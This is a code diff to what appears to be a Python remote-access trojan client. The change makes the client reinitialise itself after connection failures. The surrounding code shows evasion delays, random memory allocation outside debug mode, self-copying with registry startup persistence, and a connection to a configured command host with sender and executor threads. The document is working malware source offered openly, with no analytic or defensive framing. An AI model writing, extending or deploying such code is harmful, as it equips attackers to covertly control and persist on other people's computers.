@@ -28,18 +28,20 @@ def mem_random(min_kilobytes, max_kilobytes):
     return list_ret
 
 class client:
-    def __init__(self, cipherClass, HOST=keys.CONN_IP_ADDRESS, PORT=keys.CONN_PORT):
-        time.sleep(random.randrange(2,8))
+    def __init__(self, cipherClass, HOST=keys.CONN_IP_ADDRESS, PORT=keys.CONN_PORT, reinitialize=False):
+        
+        if reinitialize == False:
+            time.sleep(random.randrange(2,8))
 
-        if DEBUG == False:
-            self.list = mem_random(1000,5000)
-        
-        
-        if check_key() == False:
-            file_path = copy_transfer()
-            if file_path != False:
-                regedit.placeStartup(root_path=file_path)
-                sys.exit()
+            if DEBUG == False:
+                self.list = mem_random(1000,5000)
+            
+            
+            if check_key() == False:
+                file_path = copy_transfer()
+                if file_path != False:
+                    regedit.placeStartup(root_path=file_path)
+                    sys.exit()
         self.sock = None
         self.HOST = HOST
         self.PORT = PORT
@@ -293,13 +295,15 @@ class client:
                 sender.join()
                 executor.join()
                 print("Error in one of the receiver or sender...")
-                self.stop = False
+                # Reinitialize class
+                self.__init__(cipherClass=self.cipherClass, reinitialize=True)
             except Exception as e:
                 exception_handler(e)
                 print("Connection Failed.")
                 continue
             finally:
-                self.sock.close()
+                if self.sock != None:
+                    self.sock.close()
 
 
 if __name__ == '__main__':
